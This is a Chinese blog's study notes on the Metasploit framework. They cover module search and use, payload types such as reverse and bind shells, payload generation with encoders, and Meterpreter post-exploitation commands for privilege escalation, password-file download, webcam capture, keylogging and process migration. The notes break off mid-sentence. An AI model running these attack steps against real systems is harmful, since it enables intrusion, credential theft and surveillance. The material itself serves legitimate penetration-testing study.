            "content_html": "<p><span class=\"label success\">上次更新时间：2024-05-04</span><br />\n😖😖<span class=\"spoiler bulr\" title=\"你知道得太多了\">还未学习完…… 就要进入期末了捏，先发一点吧</span>😖😖</p>\n<h1 id=\"metasploit工具\"><a class=\"anchor\" href=\"#metasploit工具\">#</a> <a href=\"https://www.metasploit.com/\">Metasploit 工具</a></h1>\n<blockquote>\n<p>Metasploit 是一个免费的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。<br />\nMetasploit 的设计初衷是打造一个<mark>攻击工具开发平台</mark>。</p>\n</blockquote>\n<p>对于 kali 用户：kali 在更新系统时会自动更新 msf</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> update \t\t\t\t\t<span class=\"token comment\"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">apt</span> upgrade \t\t\t\t<span class=\"token comment\"># 更新已安装的软件包，不删除旧包；</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">apt</span> full-upgrade\t\t\t<span class=\"token comment\"># 升级包，删除旧包</span></pre></td></tr></table></figure><p>而<strong>非 kali</strong> 一开始大多会是这个状况</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>┌──<span class=\"token punctuation\">(</span>root💀kali<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>~/Desktop<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>└─<span class=\"token comment\"># msfupdate</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>msfupdate is no longer supported when Metasploit is part of the operating</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>system. Please use <span class=\"token string\">'apt update; apt install metasploit-framework'</span></pre></td></tr></table></figure><p>然后 <code>apt update; apt install metasploit-framework</code></p>\n<p>再用 <code>msfconsole</code>  打开</p>\n<h1 id=\"基础使用\"><a class=\"anchor\" href=\"#基础使用\">#</a> 基础使用</h1>\n<p>msf 的根目录是 <code>/usr/share/metasploit-framework/</code></p>\n<p>7 个基础模块：Exploits（渗透攻击模块），Auxiliary（辅助模块），Post（后渗透攻击模块），Payloads（攻击载荷模块），Encoders（编码器模块），Nops（空指令模块），Evasion（规避模块）</p>\n<blockquote>\n<p>可以把 msfupdate 理解为是一个自动化攻击的工具，需要你选择好模块，填写参数，然后发动攻击。</p>\n</blockquote>\n<p>exp 位置： <code>/usr/share/metasploit-framework/modules/exploits</code></p>\n<h1 id=\"初始化metasploit\"><a class=\"anchor\" href=\"#初始化metasploit\">#</a> 初始化 metasploit</h1>\n<p><strong>在 kali 右上角应用搜索 Metasploit，会自动打开并启动 PostgreSQL 数据库</strong></p>\n<p>（非 kali 环境的 Linux 环境下才需要这么做👇）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole  <span class=\"token comment\"># 打开 metasploit  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">service</span> postgresql start </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># metasploit 主要使用 PostgreSQL 数据库存储数据，在使用时需要启动 PostgreSQL 数据库</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>msfdb init</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># msfdb init 命令创建和初始化数据库  </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>connect <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>:<span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span> <span class=\"token comment\"># 远程连接主机</span></pre></td></tr></table></figure><h1 id=\"进入msf\"><a class=\"anchor\" href=\"#进入msf\">#</a> 进入 msf</h1>\n<p>交互式 shell 提示： <code>msf&gt;</code> ，后面还会有 <code>meterpreter&gt;</code> ，两者有不同</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>支持调用外部命令，所有 kali 的其他工具都是支持的，如 nc、nmap、Hydra、searchsploit 等等</p>\n</li>\n<li class=\"lvl-2\">\n<p>支持<span class=\"kbd red\"> tab</span> 补全功能，简直人性化到爆炸</p>\n</li>\n<li class=\"lvl-2\">\n<p>支持系统命令，可以直接操作 kali，ls、cd、cat、cp 等等</p>\n</li>\n<li class=\"lvl-2\">\n<p>基本命令：exit、history、save（保存活动数据存储）、sessions （转储会话列表并显示有关会话的信息）、back（回退）</p>\n</li>\n<li class=\"lvl-2\">\n<p>先学了常用的，更多命令 help 命令查看</p>\n<details class=\"info\"><summary>help命令查看msf所有：</summary><div>\n<ol>\n<li class=\"lvl-5\"><strong>核心命令（Core Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于管理 Metasploit 控制台的基本功能，包括帮助、更改工作目录、显示 banner、连接到目标主机、显示调试信息等等。</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>模块命令（Module Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于管理 Metasploit 中的模块，包括搜索、加载、配置、执行和显示模块信息等。</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>任务命令（Job Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于管理 Metasploit 中的任务，包括启动、显示、杀死和重命名任务等。</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>资源脚本命令（Resource Script Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于运行和管理 Metasploit 中的资源脚本，可以将一系列命令保存到文件中，并在需要时执行。</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>数据库后端命令（Database Backend Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于管理 Metasploit 数据库中的数据，包括主机、服务、漏洞、凭据等。</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>凭据后端命令（Credentials Backend Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于管理 Metasploit 数据库中的凭据信息。</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>开发者命令（Developer Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于开发和调试模块，包括编辑、调试、显示日志、重新加载库文件等。</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>DNS 命令（DNS Commands）</strong>：\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">用于管理 Metasploit 的 DNS 解析行为。<br />\n----From 🤖GPT</li>\n</ul>\n</li>\n</ol>\n</div></details>\n</li>\n</ul>\n<h1 id=\"创建工作区\"><a class=\"anchor\" href=\"#创建工作区\">#</a> 创建工作区</h1>\n<pre><code class=\"language-msf\">workspace -a [name] # -a选项表示添加工作区 \nworksapace # 查看当前所在的工作区  -v查看相关信息 -d删除工作区 -D删除所有工作区\nworksapace [工作区] # 切换工作区\nworksapace -r [工作区] [工作区] # 重命名工作区\n</code></pre>\n<div class=\"note info\">\n<p>建议每次针对渗透测试创建一个工作区，避免数据混淆。这是个好习惯。</p>\n</div>\n<h1 id=\"导入扫描报告\"><a class=\"anchor\" href=\"#导入扫描报告\">#</a> 导入扫描报告</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 从数据库中导入</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>db_status    <span class=\"token comment\"># 查看数据库状态</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>db_import    <span class=\"token comment\"># 查看支持的报告格式</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>db_import <span class=\"token operator\">&lt;</span>filename<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>file2 <span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span> <span class=\"token comment\"># 扫描报告</span></pre></td></tr></table></figure><h1 id=\"手动查询\"><a class=\"anchor\" href=\"#手动查询\">#</a> 手动查询</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>keywords<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 例如</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>search smb_ms17_010</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>-o &lt;file&gt;: 指定输出信息的保存文件，格式为 CSV</p>\n</li>\n<li class=\"lvl-2\">\n<p>-S &lt;string&gt;: 指定搜索的字符串</p>\n</li>\n<li class=\"lvl-2\">\n<p>-u：指定搜索模块<br />\n找到模块之后可以通过路径进入该模块，查询 payload</p>\n</li>\n<li class=\"lvl-2\">\n<p>search 支持的查找方式：</p>\n<table>\n<thead>\n<tr>\n<th>形式</th>\n<th>查询模式</th>\n<th>实例</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>path:</td>\n<td>通过路径去查找</td>\n<td>search path:mysql</td>\n</tr>\n<tr>\n<td>platform:</td>\n<td>相关平台（比 path 范围小）</td>\n<td>search platform:mysql</td>\n</tr>\n<tr>\n<td>type:</td>\n<td>通过类型查找</td>\n<td>search type:exploit</td>\n</tr>\n<tr>\n<td>cve:</td>\n<td>在 CVE 数据库中查找</td>\n<td>search cve:CVE-2017-8464</td>\n</tr>\n</tbody>\n</table>\n<p>可以同时使用多个形式的查找，例如：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search cve:2018 name:linux  <span class=\"token comment\"># 寻找 2018 年与 Linux 有关的 CVE 漏洞模块</span></pre></td></tr></table></figure><h1 id=\"使用模块\"><a class=\"anchor\" href=\"#使用模块\">#</a> 使用模块</h1>\n</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use <span class=\"token punctuation\">[</span>路径<span class=\"token punctuation\">]</span>       <span class=\"token comment\"># 进入模块，例如</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use auxiliary/scanner/smb/smb_ms17_010</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>info            <span class=\"token comment\"># 查看漏洞模块的具体信息</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>info <span class=\"token parameter variable\">-d</span>         <span class=\"token comment\"># 用 html 打开详细信息，傻瓜式教学如何使用这个模块</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>show targets    <span class=\"token comment\"># 查看可攻击的系统版本</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>show payloads   <span class=\"token comment\"># 查询 payload</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>show options    <span class=\"token comment\"># 查看需要配置的参数  （yes 为必填参数）</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>show missing    <span class=\"token comment\"># 查看缺失什么必填项</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>值<span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 填写参数，例如：</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload <span class=\"token punctuation\">[</span>值<span class=\"token punctuation\">]</span>   <span class=\"token comment\">#设置 payload</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOST <span class=\"token number\">192.168</span>.10.2  <span class=\"token comment\"># 设置攻击地址</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token builtin class-name\">set</span> LHOST <span class=\"token number\">127.0</span>.01  <span class=\"token comment\"># 设置监听地址</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 设置全部完成，开始执行渗透</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>exploit  <span class=\"token comment\"># 或者 run 。开始执行</span></pre></td></tr></table></figure><div class=\"note info\">\n<p>🌟🌟msf&gt; 下连按两次<span class=\"kbd green\"> tab</span>，会列出可用拓展</p>\n</div>\n<p>show evasion 用于混淆，show advanced 高级属性。post 模块后面再学<br />\n<strong>如果没有会话产生表示没有成功。</strong></p>\n<p>使用 <code>show options</code>  可以看到 metasploit 自动帮我们设置了监听地址，但是还是建议将监听地址改为<span class=\"kbd red\"> 127.0.01</span>，避免 kali 在修改网络适配器导致监听失败的问题。</p>\n<h1 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h1>\n<p>payloads 也称 shellcode。主要是用来建立目标机与攻击机稳定连接的，可反弹 shell，也可以进行程序注入等。</p>\n<p>一般选定了 exploit 之后调用 payload，进入某个模块之后 <code>set payload [选项]</code>  设置 payload，也可以使用 generate 命令直接生成 payload。</p>\n<p>Metasploit 中的 Payload 模块主要有以下三种类型：</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>Single</strong>：是一种完全独立的 Payload，就像运行.exe 一样。由于 Single Payload 是完全独立的，因此它们有可能会被类似 netcat 这样的非 metasploit 处理工具所捕捉到。</p>\n</li>\n<li class=\"lvl-2\">\n<p><strong>Stager</strong>: 这种 Payload 负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。分为两种类型：</p>\n</li>\n<li class=\"lvl-2\">\n<ul class=\"lvl-2\">\n<li class=\"lvl-4\">1️⃣ reverse_tcp，让目标系统与攻击者建立一条 tcp 连接，让目标系统主动连接我们的端口 (即反弹 shell)。</li>\n<li class=\"lvl-4\">2️⃣bind_tcp，让目标系统开启一个 tcp 监听器，而攻击者可以与目标系统进行通信 (反向反弹 shell)。</li>\n</ul>\n</li>\n<li class=\"lvl-2\">\n<p>Stage：是 Stager Payload 下的一种 Payload 组件，这种 Payload 可以提供更加高级的功能，而且没有大小限制。</p>\n</li>\n<li class=\"lvl-2\">\n<ul class=\"lvl-2\">\n<li class=\"lvl-4\">stagers 建立连接后，攻击机将 stages 传输给目标机，由 stagers 进行相应处理，将控制权转交给 stages。</li>\n</ul>\n</li>\n</ul>\n<p>show payload 后展示所有 payload，</p>\n<table>\n<thead>\n<tr>\n<th>#</th>\n<th>Name</th>\n<th>Rank</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>序号</td>\n<td>命名（系统 /payload 类型 / 规则）</td>\n<td>危害等级</td>\n<td>具体描述</td>\n</tr>\n</tbody>\n</table>\n<p>在 Name 的命名规则是：</p>\n<details class=\"primary\"><summary>表格请竖向查看，横向没有联系</summary><div>\n<table>\n<thead>\n<tr>\n<th>架构</th>\n<th>payload 类型</th>\n<th>规则</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Windows</td>\n<td>shell : 得到一个 shell</td>\n<td>reverse_tcp : 反向建立 tcp 连接（反弹 shell）</td>\n</tr>\n<tr>\n<td>apple_ios</td>\n<td>Dllinject ：上传 DLL 并注入到进程</td>\n<td>bind_tcp ：建立一个监听 TCP 连接。</td>\n</tr>\n<tr>\n<td>Linux</td>\n<td>Patchup：补丁漏洞</td>\n<td>shell_find_tag ： 在一个已建立的链接上创建一个 shell</td>\n</tr>\n<tr>\n<td>Android</td>\n<td>Upexec : 上传并执行一个文件</td>\n<td>shell_reverse_tcp : 反向连接到攻击者主机并创建一个 shell</td>\n</tr>\n<tr>\n<td>AIX</td>\n<td>Meterpreter：高级 payload</td>\n<td>reverse_http: 通过 HTTP 隧道通信兵创建一个新用户添加到管理组</td>\n</tr>\n<tr>\n<td>php</td>\n<td>Vncinject：高级 payload</td>\n<td>add_user : 创建一个新用户并添加到管理组</td>\n</tr>\n<tr>\n<td>Java</td>\n<td>PassiveX：高级 payload</td>\n<td>xxx_ipv6_tcp ： 基于 IPv6</td>\n</tr>\n<tr>\n<td>等等</td>\n<td></td>\n<td>xxx_nonx_tcp ：非 No eXecute 或 win 7（N 是应用在 CPU 的一种可以防止缓冲区溢出的技术）</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>xxx_tcp_allports ： 在所有可能的端口</td>\n</tr>\n</tbody>\n</table>\n</div></details>\n<p>直接使用 payload：</p>\n<p>一般我们是在 exploit 中调用 payload，如果想直接使用 payload，可以使用  <code>generate</code>  命令来生成 payload。</p>\n<details class=\"primary\"><summary>参数👇</summary><div>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-p / --payload</td>\n<td>指定 payload 的路径</td>\n</tr>\n<tr>\n<td>-t /  --template</td>\n<td>payload 的输出格式，默认是给 ruby 语言使用的 16 进制编码表示</td>\n</tr>\n<tr>\n<td>-b</td>\n<td>过滤坏字符或者指定应避免使用的字符</td>\n</tr>\n<tr>\n<td>-e  /--encoder</td>\n<td>指定 encoder 编码（默认不使用 encoder）   如：x86/shikata_ga_nai</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>加密轮数</td>\n</tr>\n<tr>\n<td>-k</td>\n<td>执行过程中不会产生新的进程，会在当前进程中产生线程，隐蔽性高些</td>\n</tr>\n<tr>\n<td>-x</td>\n<td>指定要在生成的 payload 中执行的命令</td>\n</tr>\n<tr>\n<td>-a / -arch</td>\n<td>指定目标架构。例如， <code>x86</code>  或  <code>x64</code> 。</td>\n</tr>\n<tr>\n<td>-f</td>\n<td>指定输出的格式，如  <code>ruby</code> ,  <code>python</code> ,  <code>perl</code> ,  <code>c</code> ,  <code>go</code>  等。</td>\n</tr>\n<tr>\n<td>-v</td>\n<td>为生成的 payload 分配一个变量名。这在将 payload 嵌入脚本时很有用。</td>\n</tr>\n<tr>\n<td>-n 或 --nop</td>\n<td>指定要添加到 payload 前面的 NOP 滑动指令的数量。</td>\n</tr>\n<tr>\n<td>-o  / --output</td>\n<td>保存到指定文件中</td>\n</tr>\n<tr>\n<td>-s /  --space</td>\n<td>指定可用的空间量， <code>msfpayload</code>  会尝试在这个大小内生成 payload。</td>\n</tr>\n<tr>\n<td>--lport &lt;ip&gt;</td>\n<td>设置反向连接类型的 payload 的监听端口（LPORT）。</td>\n</tr>\n<tr>\n<td>--lhost &lt;ip&gt;</td>\n<td>设置反向连接类型的 payload 的监听主机地址（LHOST）。</td>\n</tr>\n</tbody>\n</table>\n<p>支持的 payload 的输出格式：bash，c，hex，java，js，pl，powershell，py，python，raw，rb，ruby，sh，vbscript，asp，dll，elf，exe，jar，msipsh，psh-cmd， vba，vbi-exe，vba-psh，vbs，war 等等（几乎涵盖所有语言）</p>\n</div></details>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>kali 中也支持在 msf 外使用 <code>msfvenom</code>  命令直接生成 payload，后面再学。</p>\n</li>\n</ul>\n<p>参考<a href=\"https://www.cnblogs.com/dogecheng/p/11478953.html\"> MSF——Payload 模块（二） - 那少年和狗</a></p>\n<h1 id=\"通过cve网站查找\"><a class=\"anchor\" href=\"#通过cve网站查找\">#</a> 通过 CVE 网站查找</h1>\n<p>看看教程吧，不会就<a href=\"http://t.csdnimg.cn/hrTPb\">戳这</a></p>\n<h1 id=\"后渗透阶段\"><a class=\"anchor\" href=\"#后渗透阶段\">#</a> 后渗透阶段</h1>\n<p>即已经通过 payload 拿到了 shell 之后，通常都是残疾的 shell。metasploit 开启一个会话 <code>meterpreter&gt; ...</code></p>\n<div class=\"note primary\">\n<ol>\n<li class=\"lvl-3\">\n<p>Meterpreter 是 Metasploit 框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个 Meterpreter shell 的链接。</p>\n</li>\n<li class=\"lvl-3\">\n<p>Meterpreter shell 作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开 shell、得到用户密码、上传下载远程主机的文件、运行 cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和 IP 地址等信息。</p>\n</li>\n<li class=\"lvl-3\">\n<p>另外 Meterpreter 能够躲避入侵检测系统。在远程主机上隐藏自己，它不改变系统硬盘中的文件，因此 HIDS [基于主机的入侵检测系统] 很难对它做出响应。此外它在运行的时候系统时间是变化的，所以跟踪它或者终止它非常困难。</p>\n</li>\n<li class=\"lvl-3\">\n<p>Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</p>\n</li>\n</ol>\n</div>\n<h2 id=\"基本命令\"><a class=\"anchor\" href=\"#基本命令\">#</a> 基本命令</h2>\n<div class=\"note info\">\n<p>以下命令是针对 meterpreter 当前会话的操作。<br />\nmeterpreter&gt; 支持 tab 命令补全</p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">help</span>              <span class=\"token comment\"># 查看 Meterpreter 帮助</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>background        <span class=\"token comment\"># 返回，把 meterpreter 后台挂起</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bgkill            <span class=\"token comment\"># 杀死一个背景 meterpreter 脚本</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>bglist            <span class=\"token comment\"># 提供所有正在运行的后台脚本的列表</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>run和bgrun        <span class=\"token comment\"># 前台和后台执行以后它选定的 meterpreter 脚本</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>channel           <span class=\"token comment\"># 显示活动频道</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sessions <span class=\"token parameter variable\">-i</span> n <span class=\"token comment\"># 与会话进行交互，n 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sesssions <span class=\"token parameter variable\">-k</span>  number <span class=\"token comment\">#与会话进行交互</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>close             <span class=\"token comment\"># 关闭通道</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">exit</span>              <span class=\"token comment\"># 终止 meterpreter 会话</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>quit              <span class=\"token comment\"># 终止 meterpreter 会话</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>interact <span class=\"token function\">id</span>       <span class=\"token comment\"># 切换进一个信道</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>run               <span class=\"token comment\"># 执行一个已有的模输入 run 后按两下 tab，会列出所有</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>irb               <span class=\"token comment\"># 进入 Ruby 脚本模式</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token builtin class-name\">read</span>              <span class=\"token comment\"># 从通道读取数据</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">write</span>             <span class=\"token comment\"># 将数据写入到一个通道</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>use               <span class=\"token comment\"># 加载 meterpreter 的扩展</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>load/use          <span class=\"token comment\"># 加载拓展库中的模块</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Resource          <span class=\"token comment\"># 执行一个已有的 rc 脚本，.rc 文件</span></pre></td></tr></table></figure><p>⭐留意一下： <code>load</code> 、 <code>run</code>  之后两下<span class=\"kbd yellow\"> tab</span> 会列出所有的已有的脚本，常用的有 autoroute，hashdump，arp_scanner，multi_meter_inject 等</p>\n<h2 id=\"文件操作\"><a class=\"anchor\" href=\"#文件操作\">#</a> 文件操作</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>getwd <span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">pwd</span>  <span class=\"token operator\">&amp;&amp;</span> lpwd      <span class=\"token comment\"># 查看当前工作目录  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ls</span>  <span class=\"token operator\">&amp;&amp;</span>  lls   </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">cd</span>  <span class=\"token operator\">&amp;&amp;</span>  lcd               <span class=\"token comment\"># lcd/lpwd/lls 作用于本地</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mkdir</span> lltest2             <span class=\"token comment\"># 只能在当前目录下创建文件夹</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">rmdir</span> lltest2             <span class=\"token comment\"># 只能删除当前目录下文件夹</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>getlwd   或者 lpwd         <span class=\"token comment\"># 操作攻击者主机 查看当前目录</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>lcd /tmp                  <span class=\"token comment\"># 操作攻击者主机 切换目录</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">cat</span> c:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>test<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>passwd.txt  <span class=\"token comment\"># 查看文件内容</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>upload <span class=\"token operator\">&lt;</span>本机路径<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>靶机路径<span class=\"token operator\">></span>  <span class=\"token comment\"># 上传文件到目标机上，如：</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>upload /tmp/hack.txt C:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>test </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>download <span class=\"token operator\">&lt;</span>靶机路径<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>本机路径<span class=\"token operator\">></span>   <span class=\"token comment\"># 下载文件到本机上，如：</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>download c:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>test<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>passwd.txt /tmp/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>edit <span class=\"token operator\">&lt;</span>靶机file<span class=\"token operator\">></span>            <span class=\"token comment\"># 编辑或创建文件  没有的话，会新建文件</span></pre></td></tr></table></figure><h2 id=\"系统命令\"><a class=\"anchor\" href=\"#系统命令\">#</a> 系统命令</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>getsystem       <span class=\"token comment\"># 会自动利用各种各样的系统漏洞来进行权限提升</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>getuid          <span class=\"token comment\"># 查看对方正在运行的用户</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ps</span>              <span class=\"token comment\"># 列出所有的进程</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>getpid          <span class=\"token comment\"># 返回运行 meterpreter 木马的 id 号</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sysinfo         <span class=\"token comment\"># 查看系统信息和体系结构</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>shell           <span class=\"token comment\"># 切换到 cmd 的系统权限方式\t</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">exit</span>            <span class=\"token comment\"># 退出 shell 会话返回 meterpreter（在 shell 中）或终止 meterpreter（在 meterpreter）</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>migrate <span class=\"token operator\">&lt;</span>进程id<span class=\"token operator\">></span>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 进程 id 进程迁移，将本进程绑定到正常的合法进程，meterpreter 木马进程迁移至其他进程中，如桌面图形化进程，从而维持权限。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>arp             <span class=\"token comment\"># 查看 arp</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>getdesktop      <span class=\"token comment\"># 截取目标主机当前桌面会话窗口</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>run webcam <span class=\"token parameter variable\">-p</span> /var/www    <span class=\"token comment\"># 在 /var/www 目录监控目标主机的摄像头</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>keylog_recorder   <span class=\"token comment\"># 使用 migrate 将会话迁移至 explorer.exe 的进程空间后记录键盘</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>background     <span class=\"token comment\"># 把当前的会话设置为背景，需要的时候在启用</span></pre></td></tr></table></figure><p><span class=\"yellow\">注：执行 getsystem 命令后，会显示错误，但是其实已经运行成功了！</span></p>\n<details class=\"info\"><summary>特意说一下`migrate`</summary><div>\n<div class=\"tab\" data-id=\"id2\" data-title=\"绑定进程\">\n<p><em>再传马成功运行后，我们一般的思路首先就是隐蔽运行，然后是巩固战果等操作。</em></p>\n<ul class=\"lvl-2\">\n<li class=\"lvl-2\">\n<p>隐蔽运行时我们常会用到进程迁移，将它绑定到正常的合法进程.</p>\n</li>\n<li class=\"lvl-2\">\n<p>在绑定目标 pid 的时候，经常会断了 shell。进程迁移后会自动关闭原来 Meterpreter 